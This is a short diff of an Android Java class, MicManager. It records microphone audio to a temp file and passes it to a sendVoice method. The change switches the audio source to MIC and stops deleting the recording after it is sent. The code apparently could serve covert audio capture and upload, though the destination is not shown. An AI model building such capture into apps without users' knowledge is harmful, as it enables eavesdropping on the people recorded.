@@ -43,7 +43,7 @@ public class MicManager {
 
         //Creating MediaRecorder and specifying audio source, output format, encoder & output format
         recorder = new MediaRecorder();
-        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
         recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
         if (path.isEmpty() || path.length() < 2) {
@@ -73,7 +73,6 @@ public class MicManager {
         try {
             //Log.e("DIRR", dir.getAbsolutePath());
             audiofile = File.createTempFile("sound", ".mp3", dir);
-
             //Creating MediaRecorder and specifying audio source, output format, encoder & output format
             recorder = new MediaRecorder();
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -95,7 +94,7 @@ public class MicManager {
                 recorder.reset();
                 recorder.release();
                 sendVoice(audiofile);
-                audiofile.delete();
+                //audiofile.delete();
             }
         };
 
